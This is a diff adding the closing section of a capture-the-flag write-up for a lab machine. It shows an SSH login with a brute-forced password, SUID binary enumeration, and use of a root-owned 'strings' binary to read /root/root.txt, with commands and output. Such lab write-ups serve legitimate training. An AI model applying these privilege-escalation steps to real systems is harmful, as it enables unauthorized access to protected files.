@@ -237,5 +237,73 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-26 23:51:
 [ERROR] 0 target did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-26 23:51:35
 ```
-So i got a valid ssh password for jack, lets try logging in with ssh now
+So i got a valid ssh password for jack, lets try logging in with ssh now.
 
+```
+┌──(root㉿kali)-[/home/kali/thm/JackOffTrade]
+└─# ssh -p 80 jack@10.49.148.70
+The authenticity of host '[10.49.148.70]:80 ([10.49.148.70]:80)' can't be established.
+ED25519 key fingerprint is SHA256:bSyXlK+OxeoJlGqap08C5QAC61h1fMG68V+HNoDA9lk.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:57: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.49.148.70]:80' (ED25519) to the list of known hosts.
+jack@10.49.148.70's password:
+jack@jack-of-all-trades:~$ whoami
+jack
+jack@jack-of-all-trades:~$ 
+
+```
+And it succeed, next is to find the user flag.
+on jack home there is only a user.jpg file, i download it to my machine with nc.  
+you can find other way to transfer the file to your own machine.
+
+## GETTING ROOT
+
+After getting the user flag the next step is to find the root flag, first thing to do is to check the user sudo privillege with `sudo -l`
+```
+jack@jack-of-all-trades:~$ sudo -l
+[sudo] password for jack: 
+Sorry, user jack may not run sudo on jack-of-all-trades.
+jack@jack-of-all-trades:~$ 
+
+```
+seeing that i can't run sudo the next step is to check for SUID binary that i can exploit with this command  
+`find / -type f -perm -04000 -ls 2>/dev/null`  
+```
+jack@jack-of-all-trades:~$ find / -type f -perm -04000 -ls 2>/dev/null
+135127  456 -rwsr-xr-x   1 root     root       464904 Mar 22  2015 /usr/lib/openssh/ssh-keysign
+134730  288 -rwsr-xr--   1 root     messagebus   294512 Feb  9  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+135137   12 -rwsr-xr-x   1 root     root        10248 Apr 15  2015 /usr/lib/pt_chown
+132828   44 -rwsr-xr-x   1 root     root        44464 Nov 20  2014 /usr/bin/chsh
+132795   56 -rwsr-sr-x   1 daemon   daemon      55424 Sep 30  2014 /usr/bin/at
+132826   56 -rwsr-xr-x   1 root     root        53616 Nov 20  2014 /usr/bin/chfn
+133088   40 -rwsr-xr-x   1 root     root        39912 Nov 20  2014 /usr/bin/newgrp
+133270   28 -rwsr-x---   1 root     dev         27536 Feb 25  2015 /usr/bin/strings
+133273  148 -rwsr-xr-x   1 root     root       149568 Mar 12  2015 /usr/bin/sudo
+133111   56 -rwsr-xr-x   1 root     root        54192 Nov 20  2014 /usr/bin/passwd
+132940   76 -rwsr-xr-x   1 root     root        75376 Nov 20  2014 /usr/bin/gpasswd
+133161   88 -rwsr-sr-x   1 root     mail        89248 Feb 11  2015 /usr/bin/procmail
+138022 3052 -rwsr-xr-x   1 root     root      3124160 Feb 17  2015 /usr/sbin/exim4
+    85   40 -rwsr-xr-x   1 root     root        40000 Mar 29  2015 /bin/mount
+   131   28 -rwsr-xr-x   1 root     root        27416 Mar 29  2015 /bin/umount
+   114   40 -rwsr-xr-x   1 root     root        40168 Nov 20  2014 /bin/su
+jack@jack-of-all-trades:~$ 
+
+```
+We can run strings as root, which means we can use it to read the contents of files with root privileges, lets try reading root.txt with it.
+```
+jack@jack-of-all-trades:~$ strings /root/root.txt
+ToDo:
+1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
+2.Make T-Rex model!
+3.Meet up with Johny for a pint or two
+4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
+5.Remember to finish that contract for Lisa.
+6.Delete this: secu<REDACTED>
+jack@jack-of-all-trades:~$
+```
+With that i got the Root Flag!
+
+## Conclusion
+This is a fun room and thank you for reading!
